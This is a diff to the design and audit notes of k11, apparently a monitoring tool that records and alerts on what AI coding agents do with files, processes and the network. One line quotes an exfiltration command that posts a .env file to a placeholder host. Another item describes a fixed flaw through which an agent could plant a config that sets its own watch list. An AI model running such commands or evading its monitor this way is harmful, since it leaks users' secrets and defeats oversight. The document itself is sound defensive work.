@@ -10,6 +10,26 @@ no action planned).
 
 ---
 
+## Promise gaps (2026-11-04)
+
+What stands between k11 today and "every file, process, network and socket action", and between a recorder and something people keep open. Little Snitch is the model for the second: it shows what an app reaches as it happens and turns an answer into a rule.
+
+- [x] **Command lines.** Exec records named the binary only: `curl -d @.env https://x` was `exec /usr/bin/curl`. The probe now reads argv from the new image (`mm->arg_start..arg_end`, offsets from BTF) into a record built in the ring, up to 1 KB, and says when it cut. Event lines name the binary exec found, then the arguments, so argv[0] cannot pose as another program; OCSF carries `process.cmd_line`; the dashboard shows it per process; processes already running when watched take theirs from /proc.
+- [x] **`k11 report`**: past sessions from the OCSF log. The log is replayed through the daemon's own store (`ocsf::replay`, the inverse of `record`, tested record by record), so `k11 report last` prints what `k11 run` printed, commands included. The export is now on by default, so the record exists without a config.
+- [ ] **A past session in the dashboard**: the same replay, served.
+- [x] **The config was searched in the working directory** (`config/k11.toml`), as root: an agent could leave one in its project and pick k11's watch list, policy and export path. Only `/etc/k11/k11.toml`, `$K11_CONFIG` or `--config` now. A test checks the example config parses to the defaults.
+- [ ] **Inbound and connectionless network**: `accept`, `sendto`/`sendmsg` destinations, bytes sent. Less than it looks for agents: libuv (Node, so Claude Code) accepts with no peer address, and glibc's resolver connects its UDP sockets, so DNS is already a connect to port 53. What matters more is the name an agent looked up: k11 sees addresses, and rDNS of a CDN says little.
+- [x] **Names looked up.** A uprobe and uretprobe on `getaddrinfo` in the host's libc, and in each container's (its maps, through `/proc/<pid>/root`, once per file), record the name asked and the addresses returned: DNS Activity (4003) in OCSF. The enricher learns the pairing, so a connect, its notice, the network tab and `k11 report` name what the agent asked for. Static binaries that resolve on their own (Go) stay addresses.
+- [x] **Tell.** Notices for an agent reaching a host outside this machine's networks, opening a port to other hosts, touching a sensitive file (failed attempts included), matching a deny rule, tracing a process: once per agent tree and target, kept by the daemon (500), polled by id (`GetNotices`). The dashboard shows them with an unread count in the tab title, turns a file notice into a deny rule in one click, and raises desktop alerts when asked.
+- [x] **Quiet what is expected.** Several agents reaching `api.anthropic.com` through a CDN made a notice per address per tree. A host is now news once per tree by the name it looked up; any notice can be quieted from the dashboard (`QuietNotices`, with control), which drops it and makes no more, kept in `state.toml` or set as `notices.quiet`. Little Snitch's "allow" without enforcement.
+- [ ] **Ask, for hosts (needs a decision).** Deny a host from its notice: a `socket_connect` deny next to `file_open`. k11 sees addresses, not the names an agent looked up, so a rule is an address (or its network) labelled with what k11 resolved. This widens the enforcement surface the non-goals keep at `file_open` (X2).
+- [ ] **Control that survives a reload**: today only the tab `k11` opened can change anything.
+- [ ] **Privilege and escape**: setuid and capabilities changes, `unshare`, `setns`, `mount`, `bpf`, module loading, `kill`.
+- [ ] **Housekeeping**: this file mixes old audits, the plan and limitations.
+  - [x] `store.rs` (1,200 lines) is `store/{event,tree,mod}.rs`: what an event is, one tree's aggregates, the store across trees.
+
+---
+
 ## Audit (2026-11-02)
 
 Full pass over probe, daemon, proto, dashboard, build and packaging.
@@ -147,7 +167,7 @@ Checked against schema.ocsf.io 1.1.0.
   - [x] `correlation_uid` is now `<boot id>:<root pid>`: stable across daemon restarts.
   - [x] Typed `unmapped` fields (`root_pid`, `risk_score`, mode, gid, backlog, ptrace request, symlink target) and `access_mask` for open flags.
   - [x] `metadata.sequence` from the decoder's per-event `seq`.
-  - [ ] Record types are serialize-only; `Cow` plus `Deserialize` gives one set of types both ways. Do it with `k11 report`.
+  - [x] Record types are serialize-only. `k11 report` reads back with its own small types (`ocsf/read.rs`) sharing the class and activity constants; the record types borrow from the live event and stay as they are.
   - [x] Loss markers: when probe counters grow, the export gets a Base Event ("k11 lost N records") with the deltas.
 
 ### DNS and GeoIP
@@ -171,7 +191,8 @@ Checked against schema.ocsf.io 1.1.0.
 - [x] **Events name their container.** The probe stamps each record with the task's cgroup id; the daemon resolves it once through a kernfs handle and recognizes podman, docker, containerd, CRI-O and LXC paths. Processes, agents and OCSF records (the `container` profile) carry runtime and id; host and VM processes carry none.
 - [x] **`k11` alone starts everything.** It asks sudo for itself, records nothing, and opens the dashboard with control; the watch list is edited there (`GetWatch`, `SetWatch`, token-gated like the policy), with presets for common agent CLIs. Startup and the dashboard share one path (`Lineage::set_names`). Seeding no longer re-roots a process already in a tree, nor k11 itself.
 - [x] **Keep dashboard changes across restarts.** The watch list and the policy, once changed in the dashboard, go to root-only `/var/lib/k11/state.toml` (replaced whole) and replace the config's at the next start; a section the dashboard never touched stays the config's.
-- [ ] **Container names and images.** The cgroup holds only the id; the name and image live in each runtime's state (podman's `containers.json`, docker's `config.v2.json`). Also OCSF's `namespace_pid`.
+- [x] **Container names and images.** The cgroup holds only the id; the name and image now come from each runtime's state, once per container: podman's `containers.json` (rootless: in the home of the `user-<uid>.slice` owner), CRI-O's (same library), docker's `config.v2.json`. They are labels, writable by whoever owns that state; the id stays what identifies a container. containerd keeps them in a database: id only.
+- [ ] **OCSF `namespace_pid`**: the pid as the container sees it.
 - [x] **Count program runs the kernel skips.** Since 7.2 a program preempted on a CPU makes the kernel skip the same program for other tasks there (per-program recursion guard); BPF LSM always worked this way. The kernel counts them (`bpf_prog_info.recursion_misses`); k11 reports them with the other loss counters, `skipped_file_open` apart since it is an open no deny rule checked. Measured with an 8-thread burst: 6,000 to 12,000 of about 40,000 runs skipped on 7.3, none before 7.2; `file_open` none so far. Raw tracepoints and trampolines use the same guard, so no attach type avoids it; the fix is upstream.
 - [~] **Node renames its main thread to `MainThread`**, so events from node agents carry that comm. Discovery uses the exec-time comm and the process list keeps the exec name; per-access comms show `MainThread`.
 
